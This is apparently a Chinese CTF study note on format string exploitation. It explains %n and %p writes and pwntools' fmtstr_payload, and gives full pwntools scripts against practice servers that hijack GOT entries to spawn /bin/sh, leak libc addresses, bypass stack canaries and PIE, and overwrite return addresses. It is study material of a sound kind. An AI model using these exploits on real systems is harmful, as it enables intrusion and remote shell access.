# Format_str

# 命令

关于格式化字符串漏洞的命令记录一下：

```python
%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。

%7$n       //让格式化字符串的第7个参数对应的整型指针参数所指的变量为输出的字符数量

%7$p       //以地址的格式输出格式化字符串的第7个参数

AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p      //查看格式化字符串存储的字符串的地址在哪
AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p      //查看格式化字符串存储的字符串的地址在哪

payload = fmtstr_payload(7, {puts_got: system_addr})          //(偏移，{原地址：将其修改的值})
											
```

## `fmtstr_payload`函数

<aside>
💡 `fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')`
第一个参数：表示格式化字符串的偏移
第二个参数：表示需要利用%n写入的数据，采用字典形式，我们要将`printf`的GOT数据改为system函数地址，就写成`{printfGOT:systemAddress}`；
第三个参数：表示已经输出的字符个数
第四个参数：表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着`hhn`、`hn`和`n`，默认值是byte，即按`hhn`写

</aside>

注意！这里的`offset`和 `%7$p` 这里的`7`还是不一样的，还是需要注意看它生成的payload进行调试，有一次比赛的时候我使用offset为14，但是在`fmtstr_payload` 中就是6，很怪

它生成payload的思路是这样的：

1. **`%3440c%22$lln`**：这将打印**`3440`**个字符，然后将这个数（**`3440`**或**`0x0D78`**）写入第22个参数指向的地址。
2. **`%15c%23$hhn`**：再打印15个字符，这样总计字符数为**`3455`**或**`0x0D87`**，然后将这个总数的最后一个字节（即**`0x87`**）写入第23个参数指向的地址。
3. **`%6c%24$hhn`**：再打印6个字符，使得总计字符数为**`3461`**或**`0x0D8D`**，然后将这个总数的最后一个字节（即**`0x8D`**）写入第24个参数指向的地址。
4. **`%112c%25$hhn`**：打印额外的112个字符，总计为**`3573`**或**`0x0DFD`**，然后将这个数的最后一个字节（即**`0xFD`**）写入第25个参数指向的地址。
5. **`%65c%26$hhn`**：再打印65个字符，使得总计字符数为**`3638`**或**`0x0E3E`**，然后将这个总数的最后一个字节（即**`0x3E`**）写入第26个参数指向的地址。

总结：

- 地址1（由第22个参数指示）写入了**`3440`**或**`0x0D78`**
- 地址2（由第23个参数指示）的最后一个字节被修改为**`0x87`**
- 地址3（由第24个参数指示）的最后一个字节被修改为**`0x8D`**
- 地址4（由第25个参数指示）的最后一个字节被修改为**`0xFD`**
- 地址5（由第26个参数指示）的最后一个字节被修改为**`0x3E`**

## 自动获取offset偏移值

```python
def exec_fmt(payload):
		io.sendline(payload)
		info = io.recv()
		return info
auto = FmtStr(exec_fmt)
offset = auto.offset
```

# Got劫持

```python
from pwn import *
context.log_level = 'debug'
#io = process('./fmt')
io = remote('127.0.0.1',10000)
elf = ELF('./pwn')
offset = 6
printf_got = elf.got['printf']
system_plt = elf.plt['system']
payload = fmtstr_payload(offset,{printf_got:system_plt})
io.sendline(payload)
io.recv()
io.sendline('/bin/sh\x00')
io.interactive()
```

```python
from pwn import *
import warnings
from LibcSearcher import *
import re

warnings.filterwarnings("ignore")
# 修改context上下文
context(os='linux', arch='i386', log_level='debug',endian='little')
elf = ELF("./pwn")
printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
main_addr = elf.symbols['main']

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

def forc():
    # sh = process('./pwn')
    sh =  remote('pwn.challenge.ctf.show',28157)
    payload = p32(puts_got)+b"%6$s"
    sh.recvuntil("**                           \n")
    sh.send(payload)

    puts_addr = u32(sh.recvuntil('\xf7')[-4:])

    libc = LibcSearcher("puts",puts_addr)
    libc_base = puts_addr - libc.dump("puts")   
    system_addr = libc_base + libc.dump("system")
    binsh = libc_base + libc.dump("str_bin_sh")

    payload2 = fmtstr_payload(6,{printf_got:system_addr})
    sh.sendline(payload2)

    sh.sendline("/bin/sh\x00")
    sh.interactive()

forc()
```

收获：

- 想要用`printf`打印地址不能直接进行`printf([addr of something])`，这样会直接就打印出got表的地址而不是got表指向的地址，要这样的话必须要用`printf(p32(puts_got)+b"%6$s")`这样的形式，这样可以打印出got表指向的真实地址
- 用 `u32(sh.recvuntil('\xf7')[-4:])`可以比较准确的写出相关的地址信息，这个`\xf7`就是用`gdb`的`vmmap`指令查询了关于`libc`的地址范围，一般的开头地址都是以`7f`开头的，是很大的地址范围。
- `recvuntil` 函数用法

```python
t.recv_raw = lambda n: b"Hello World!"
t.recvuntil(b' Wor', drop=True)     //b'Hello'
```

## 不栈对齐的格式化漏洞

```python
from pwn import *
import warnings
from LibcSearcher import *
import re

warnings.filterwarnings("ignore")
# 修改context上下文
elf = ELF("./axb_2019_fmt32")

printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
main_addr = elf.symbols['main']

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

def forc():
	# sh = process('./pwn')
	sh =  remote('node4.buuoj.cn',25260)
	payload =b'a'+ p32(puts_got)+b"%8$s"
	sh.recvuntil('me:')
	sh.sendline(payload)

	puts_addr = u32(sh.recvuntil('\xf7')[-4:])
	print(hex(puts_addr))
	libc = LibcSearcher("puts",puts_addr)
	libc_base = puts_addr - libc.dump("puts")   
	system_addr = libc_base + libc.dump("system")
	#binsh = libc_base + libc.dump("str_bin_sh")
	
	payload2 =b'a'+fmtstr_payload(8,{printf_got:system_addr},numbwritten=0xa)
	sh.recvuntil('me:')
	sh.sendline(payload2)
	
	#sh.recvuntil('me:')
	sh.sendline(";/bin/sh\x00")
	sh.interactive()

forc()
```

收获：

- `fmtstr_payload`的更深一层的用法，`fmtstr_payload`函数返回一个字节字符串，可以通过在前面叠加字符串的方式来形成对齐，对齐之后可以进行操作。`numbwritten`参数告诉`fmtstr_payload`函数此时字符串已经写了多少字符串，让函数相对应减少相关字符串的生成以达到注入正确的字符串
- `sh.sendline(";/bin/sh\x00")`，通过使用`;`号在进行命令的时候，`;`是一个 shell 分隔符，它允许在同一行中执行多个命令。因此，当**前一个**命令失败后，shell 会继续执行下一个命令。

# 栈内容获取

```python
from pwn import *
import warnings
from LibcSearcher import *

warnings.filterwarnings("ignore")
# 修改context上下文
context(os='linux', arch='i386', log_level='debug',endian='little')
elf = ELF("./pwn")

sh =  remote('pwn.challenge.ctf.show',28111)

offset = 22 

result = b''
i=6
for i in range(6,18):
    payload2 = f"%{i}$p"

    sh.sendlineafter("$ ",payload2)
    part = unhex(sh.recvuntil("\n",drop=True).replace(b"0x",b""))
    result+=part[::-1]
    
print(result)
```

收获：

- 在栈上的字符串是直接贮存的字符数组，而不是地址，所以需要使用`%p`，而不是`%s`
- 小端存储的字符串需要注意，`0x73667463 —> 63 74 66 73 （内存中） —> b"ctfs"`
- 每一个`sh.recv`返回的字符串都是以`\n`结尾的，使用`recvuntil`进行相关截取

# 绕过canary

```python
from pwn import *
context.log_level = 'debug'
io = remote('pwn.challenge.ctf.show',28213)
elf = ELF('./pwn')
backdoor = elf.sym["__stack_check"]

payload = "%15$p"

io.sendline(payload)
canary = int(io.recv(),16)

payload2 = b"a"*(0x28)+p32(canary)+b"a"*(0xc)+p32(backdoor)
io.sendline(payload2)
io.interactive()
```

- 注意首先把logo的内容`recv`了
- 注意gdb来寻找`canary`，还可以从ida中直接进行查看。经过ctfshow群中的一个大佬解释我才知道，函数中`v2 = __readgsdword(0x14u);`这是对`canary`进行的初始化，其值在ida中被记录着，可以直接进行查看位置

```python
def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr

def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload
payload = fmt_str(6,4,0x0804A028,0x12345678)
```

# 修改返回地址

```python
from pwn import *
import warnings
from LibcSearcher import *

warnings.filterwarnings("ignore")
offset = 8 
secret_key = 0x202060

def fmt_attack(payload):
    sh.sendlineafter(">>","2")
    sh.sendline(payload)

sh =  remote('pwn.challenge.ctf.show',28106)

sh.recv()
sh.send("11\n11\n11\n")

payload = "%7$n-%16$p"
fmt_attack(payload=payload)
sh.recvuntil("-")
ret_addr = int(sh.recvuntil("\n")[:-1],16) - 0x28

payload = "%7$n+%17$p"
fmt_attack(payload=payload)
sh.recvuntil("+")
ret_value = int(sh.recvuntil("\n")[:-1],16)
elf_base = ret_value - 0x102c
addr_changed =(elf_base + 0xF56)&0xffff

# payload2 = fmtstr_payload(8, {ret_addr: addr_changed},write_size='short')
payload2 = b"%"+str(addr_changed).encode() +b"c%10$hn"
payload2 = payload2.ljust(0x10,b'a')
payload2 += p64(ret_addr)

print(payload2)
fmt_attack(payload2)

sh.interactive()
```

收获：

- 注意分开栈中的`addr`和`value`的区别，用`%p`得到的是`value`，需要对地址上的值进行更改的时候需要的是`addr`
- `PIE`开启的情况下，通过对函数的返回地址减去偏移值可以直接得到`elf_base`，达到`PIE`绕过的操作
- x64系统的一个地址是占8个字节，修改的时候因为`PIE`的偏移差不多是后两个字节，也就是需要用`hn`来进行地址的修改
- 格式化字符串和栈溢出字符串不一样，是需要修改调用`**printf`函数的函数**的`rbp+8`的地址（比如说调用`printf`的`fmt_attack`函数的`rbp+8`
- 因为要覆盖改变的`rbp+8`在格式化字符串存储位置的后面，不能直接使用`fmtstr_payload`函数

%99c%17$hhn%200c%18$hhn%219c%19$hhn%228c%20$hhn%233c%21$hhn%172c%22$hhnaF\x160þ\x7f\x00\x00F\x160þ\x7f\x00\x00F\x160þ\x7f\x00\x00F\x160þ\x7f\x00\x00F\x160þ\x7f\x00\x00F\x160þ\x7f\x00\x00